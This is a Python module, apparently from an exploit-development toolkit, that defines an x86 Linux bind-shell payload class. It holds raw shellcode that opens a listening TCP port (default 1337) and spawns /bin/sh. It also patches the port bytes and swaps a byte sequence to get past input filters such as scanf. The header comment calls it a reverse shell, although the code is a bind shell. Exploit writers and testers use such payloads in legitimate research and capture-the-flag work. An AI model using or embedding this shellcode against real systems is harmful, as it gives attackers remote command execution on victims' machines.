#!/usr/bin/python
#
# TCP Reverse Shell

import struct

from ..shellcode import ShellCode
from ..util import patch 

class x86LinuxBindShell(ShellCode):
    def __init__(self, args):
        super(x86LinuxBindShell, self).__init__()
        self.port = args[0]

        # x86 Linux Bind TCP Shell
        # Default port: 1337
        self.opcodes = (
        "\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96"
        "\x43\x52\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x66\x58\x50\x51"
        "\x56\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89"
        "\xe1\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9"
        "\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52"
        "\x53\x89\xe1\xcd\x80")

        if self.port != 1337:
            self.opcodes = patch(self.opcodes, "\x05\x39", struct.pack(">h", self.port))

        self.fixes = {
            # mov al, 0xb -> mov al, 0xe; sub al, 0x3
            'isoc99_scanf' : ["\xb0\x0b", "\xb0\x0e\x2c\x03"]
        }

    def __str__(self):
        append = super(x86LinuxBindShell, self).__str__()
        return "Port : {} ({})\n{}".format(
            self.port, 
            "0x" + hex(self.port)[2:].zfill(4), 
            append)
